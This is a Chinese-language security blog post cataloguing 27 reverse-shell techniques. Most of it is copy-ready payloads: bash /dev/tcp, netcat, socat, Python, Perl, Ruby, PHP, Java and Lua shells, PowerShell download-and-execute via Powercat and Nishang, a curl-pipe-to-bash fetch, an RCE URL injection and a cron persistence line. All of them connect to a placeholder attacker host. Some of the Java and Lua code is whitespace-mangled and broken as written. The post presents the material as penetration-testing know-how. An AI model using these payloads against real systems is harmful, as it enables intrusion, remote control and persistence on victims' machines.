---
date: 2021-09-01
title: 全面解析 27 种 WebShell 反弹技术
authors: [SecAdmin]
description: >
  本文详细介绍了多达 27 种 WebShell 反弹技术，涵盖 Bash、Netcat、Python、Java 等多种编程语言实现的反弹方法，还包括利用系统工具、漏洞、计划任务等特殊途径进行反弹的操作。同时，为深入探索相关知识，提供了 aspx、ascx、ashx、asmx 等文件的技术研究链接。无论是网络安全从业者提升渗透测试技能，还是技术爱好者深入了解 WebShell 原理，本文都能提供丰富且实用的内容。
categories: 攻防兼备
tags:
  - 网络安全
  - WebShell
  - 系统安全
---

# 全面解析 27 种 WebShell 反弹技术

### 1. Bash反弹

```text
# 攻击者主机上执行监听
nc -lvvp port
# 目标主机上执行
bash -i >& /dev/tcp/x.x.x.x/port 0>&1
```

### 2. Netcat反弹

```text
# 攻击者主机上执行监听
nc -lvvp port
# 目标主机上执行
nc -e /bin/bash x.x.x.x port
```

### 3. Telnet反弹

```text
# 攻击者主机上打开两个终端分别执行监听
nc -lvvp 4444
nc -lvvp 5555
# 目标主机中执行
telnet x.x.x.x 4444 | /bin/bash | telnet x.x.x.x 5555
```

### 4. Socat反弹

```text
# 攻击者主机上执行监听
socat TCP-LISTEN:port,fork -
# 目标主机上执行
socat tcp-connect:x.x.x.x:port exec:'bash -li',pty,stderr,setsid,sigint,sane
```

### 5. Python反弹

```text
# 目标主机上执行
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'
```

### 6. Perl反弹

```text
# 目标主机上执行
perl -e 'use Socket;$i="x.x.x.x";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### 7. Ruby反弹

```text
# 目标主机上执行
ruby -rsocket -e 'c=TCPSocket.new("x.x.x.x","port");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### 8. PHP反弹

```text
# 目标主机上执行（假设有Web服务器权限）
php -r '$sock=fsockopen("x.x.x.x",port);exec("/bin/bash -i <&3 >&3 2>&3");'
```

### 9. Powershell反弹（Windows环境）

```text
# 攻击者主机上执行监听（使用Powercat脚本）
powershell IEX (New-Object System.Net.WebClient).DownloadString('http://x.x.x.x:port/powercat.ps1'); powercat -c x.x.x.x -p port -e cmd
# 目标主机上执行（假设可以下载并执行Powercat脚本）
```

### 10. OpenSSL反弹

```text
# 这种方法利用OpenSSL生成自签名证书，并通过TLS/SSL隧道传输shell会话。
# 攻击者主机上生成密钥并启用监听
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port port
# 目标主机上执行
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect x.x.x.x:port > /tmp/s; rm /tmp/s
```


### 11. Java反弹

```text
import java.io.*;
import java.net.*;
publicclassReverseShell{
publicstaticvoidmain(String[] args){
Stringhost="x.x.x.x";// 攻击者IP
intport=1234;// 监听端口
try(Socketsocket=newSocket(host, port);
BufferedReaderin=newBufferedReader(newInputStreamReader(socket.getInputStream()));
PrintWriterout=newPrintWriter(socket.getOutputStream(),true);
BufferedReaderstdIn=newBufferedReader(newInputStreamReader(System.in));
BufferedWriterstdOut=newBufferedWriter(newOutputStreamWriter(System.out))){
// 线程用于读取攻击者的命令并执行
newThread(()->{
try{
String command;
while((command = in.readLine())!=null){
Processprocess=Runtime.getRuntime().exec(command);
// 获取命令输出
try(BufferedReaderprocessIn=newBufferedReader(newInputStreamReader(process.getInputStream()));
BufferedReaderprocessError=newBufferedReader(newInputStreamReader(process.getErrorStream()))){
String line;
while((line = processIn.readLine())!=null){
                                out.println(line);
}
while((line = processError.readLine())!=null){
                                out.println(line);
}
}
}
}catch(Exception e){
                    e.printStackTrace();
}
}).start();
// 线程用于将本地shell的输出发送到攻击者
newThread(()->{
try{
String line;
while((line = stdIn.readLine())!=null){
                        out.println(line);
}
}catch(IOException e){
                    e.printStackTrace();
}
}).start();
}catch(IOException e){
            e.printStackTrace();
}
}
}
```

### 12. Lua反弹

```text
local host ="x.x.x.x"
local port =1234
local socket =require("socket")
local tcp = socket.tcp()
tcp:connect(host, port)
localfunction read_command()
local command = tcp:receive("*l")
return command
end
localfunction execute_command(command)
local file =io.popen(command)
localoutput= file:read("*all")
    file:close()
    tcp:send(output.."\n")
end
whiletruedo
local command = read_command()
if command ==nilthenbreakend
    execute_command(command)
end
tcp:close()
```

### 13. Nishang框架（PowerShell）

```text
# 在攻击者机器上监听
IEX (New-Object Net.WebClient).DownloadString('http://x.x.x.x/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress x.x.x.x -Port 1234
# 在目标机器上执行（假设可以下载并执行脚本）
IEX (New-Object Net.WebClient).DownloadString('http://x.x.x.x/Invoke-ReverseTcpShell.ps1')
Invoke-ReverseTcpShell -IPAddress x.x.x.x -Port 1234
```

### 14. 使用Web服务器

```text
<?php
$ip='x.x.x.x';// 攻击者IP
$port=1234;// 监听端口
$sock=fsockopen($ip,$port);
$proc=proc_open('/bin/bash -i',array(0=>$sock,1=>$sock,2=>$sock),$pipes);
?>
```

### 15. 利用系统工具（如curl或wget）

```text
# 在攻击者机器上创建一个简单的bash反弹shell脚本，并将其托管在Web服务器上
echo 'bash -i >& /dev/tcp/x.x.x.x/1234 0>&1' > reverse_shell.sh
python3 -m http.server 80  # 使用Python的HTTP服务器托管脚本
# 在目标机器上执行curl命令下载并执行反弹shell脚本
curl http://x.x.x.x/reverse_shell.sh | bash
```

### 16. 利用漏洞（如远程代码执行漏洞）

```text
# 假设目标系统有一个RCE漏洞，可以通过URL参数执行任意命令
# 例如：http://target.com/vulnerable_page.php?cmd=whoami
# 构造反弹shell命令并通过RCE漏洞执行
curl "http://target.com/vulnerable_page.php?cmd=bash+-i+>&+/dev/tcp/x.x.x.x/1234+0>&1"
```

### 17. 自定义脚本

```text
import os
import socket
host ='x.x.x.x'# 攻击者IP
port =1234# 监听端口
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
os.dup2(s.fileno(),0)# stdin
os.dup2(s.fileno(),1)# stdout
os.dup2(s.fileno(),2)# stderr
os.system('/bin/bash -i')
```

### 18. 使用Python的`pty`库模拟终端

```text
import os
import pty
import socket
host ='x.x.x.x'
port =1234
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
# 使用pty模拟终端
master, slave = pty.openpty()
os.dup2(slave.fileno(),0)
os.dup2(slave.fileno(),1)
os.dup2(slave.fileno(),2)
os.execvp('/bin/bash',['/bin/bash','-i'])
# 注意：在实际使用中，可能需要在攻击者端使用类似screen或tmux的工具来管理pty会话
```

### 19. 利用Python的`paramiko`库进行SSH反弹

```text
import paramiko
import subprocess
import os
# 攻击者端设置SSH服务器监听
# 需要一个外部的SSH服务器或者使用Python的SSH库（如paramiko的ServerInterface）来模拟
# 这里假设已经有一个SSH服务器在监听
# 目标端执行以下Python代码
hostname ='x.x.x.x'# 攻击者SSH服务器IP
port =22
username ='attacker_user'
password ='attacker_password'
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(hostname, port, username, password)
# 开启一个反向隧道
transport = client.get_transport()
chan = transport.open_session()
chan.invoke_shell()
# 将标准输入、输出和错误输出重定向到该SSH会话
os.dup2(chan.makefile('wb',-1).fileno(),1)
os.dup2(chan.makefile('rb',-1).fileno(),0)
os.dup2(chan.makefile_stderr('rb',-1).fileno(),2)
# 启动bash shell
os.execvp('/bin/bash',['/bin/bash','-i'])
```

### 20. 使用Perl的`IO::Socket`模块

Perl的`IO::Socket`模块可以用于创建网络连接，从而实现反弹shell。

```text
#!/usr/bin/perl -w
use strict;
use IO::Socket::INET;
my $remote_ip ='x.x.x.x';# 攻击者IP
my $remote_port =1234;# 监听端口
my $sock = IO::Socket::INET->new(PeerAddr => $remote_ip,PeerPort => $remote_port,Proto =>'tcp');
die"Could not create socket: $!\n"unless $sock;
# 将标准输入、输出和错误输出重定向到socket
open STDIN,">&=$sock";
open STDOUT,">&=$sock";
open STDERR,">&=$sock";
# 启动shell
exec("/bin/bash -i");
```

### 21. 利用Java的`JSch`库进行SSH反弹（类似paramiko）

`JSch`是一个Java实现的SSH2库，可以用于创建SSH连接。如果目标系统允许SSH连接，并且攻击者拥有凭据，那么可以使用`JSch`进行SSH反弹。

因为涉及的内容较多，包括设置SSH服务器、处理认证等，不再给出完整的Java代码示例。但基本思路是：在攻击者端设置一个SSH服务器，然后在目标端使用`JSch`库连接到该服务器，并开启一个反向隧道。

### 22. 使用Ruby的`drb`（Distributed Ruby）进行反弹

Ruby的`drb`（Distributed Ruby）可以用于创建分布式对象系统。虽然不常用于反弹shell，但在某些场景下可能是一个有趣的选择。

**注意**：由于`drb`不是专门用于反弹shell的，因此实现起来可能比较复杂，并且需要攻击者设置一个DRuby服务器。

### 23. 利用目标系统的计划任务或cron作业

如果攻击者能够在目标系统上添加计划任务或cron作业，那么可以设置一个任务来执行反弹shell命令。

例如，在Linux系统上，可以使用`crontab -e`来添加一个定时任务：

```text
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/x.x.x.x/1234 0>&1'
```

**注意**：这种方法需要攻击者具有在目标系统上添加计划任务或cron作业的权限。

### 24. 使用目标系统的服务或守护进程

某些服务或守护进程可能允许攻击者配置外部命令或脚本的执行。攻击者可以利用这些服务来执行反弹shell命令。

例如，某些Web服务器允许在配置文件中指定错误处理脚本。攻击者可以修改这些配置文件，使其在发生错误时执行反弹shell命令。

**注意**：这种方法需要攻击者具有修改目标系统服务或守护进程配置的权限。

### 25. 利用目标系统的漏洞利用工具集

许多漏洞利用工具集（如Metasploit Framework）提供了自动化的反弹shell功能。攻击者可以使用这些工具集来利用目标系统的已知漏洞，并自动执行反弹shell命令。

**注意**：使用漏洞利用工具集需要攻击者对目标系统的漏洞有深入的了解，并且需要确保所使用的工具集是最新且安全的。

### 26. 使用目标系统的内置脚本语言（如Python、Perl等）的Web接口

如果目标系统提供了内置脚本语言（如Python、Perl等）的Web接口（如CGI、FastCGI等），攻击者可能可以利用这些接口来执行反弹shell命令。

例如，攻击者可以上传一个包含反弹shell代码的CGI脚本，并通过Web浏览器访问该脚本来触发反弹shell。

**注意**：这种方法需要攻击者能够上传并执行Web脚本，并且目标系统需要允许这些脚本语言的Web接口。

### 27. 利用目标系统的远程桌面协议（如RDP、VNC等）的反向连接功能

某些远程桌面协议（如RDP、VNC等）允许反向连接，即目标系统主动连接到攻击者的机器。攻击者可以配置这些协议以使用反向连接模式，并在目标系统上启动远程桌面客户端来建立连接。

**注意**：这种方法需要攻击者具有在目标系统上启动远程桌面客户端的权限，并且目标系统需要支持反向连接功能。

**反弹shell是渗透测试中不可或缺的技术之一，允许攻击者获得对目标系统的交互式访问权限，网络安全从业者需要掌握且擅长，能根据不同的场景来使用不同的反弹shell姿势。**


### aspx,ascx,ashx

- https://blog.csdn.net/liangmengbk/article/details/92562585

ascx
- https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-061744

Asmx
- https://www.freebuf.com/articles/web/178010.html
